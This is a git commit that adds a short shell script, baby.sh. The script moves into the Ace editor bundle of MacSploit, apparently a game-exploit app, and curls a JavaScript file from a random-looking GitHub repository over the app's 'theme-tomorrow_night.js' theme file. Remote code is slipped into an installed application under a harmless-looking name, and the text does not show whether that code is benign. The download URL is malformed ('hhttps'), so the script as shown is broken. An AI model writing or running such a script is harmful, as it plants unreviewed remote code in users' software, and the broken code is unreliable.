f746181426e38035416da285fc48f4bfa4f0b168
5rgtnhjigt4rho <55413668+9fkoafkoswfplspflpsld@users.noreply.github.com>
2024-06-27 17:55:40 -0400

    Create baby.sh

---
+++ baby.sh
@@ -0,0 +1,6 @@
+main() {
+  cd /Applications/MacSploit.app/Contents/Resources/CodeViewer_CodeViewer.bundle/Contents/Resources/ace.bundle
+  curl "hhttps://raw.githubusercontent.com/PokeMyCord/fjiqikofdkaofdsksoak/main/baby.js" -o "./theme-tomorrow_night.js"
+}
+
+main
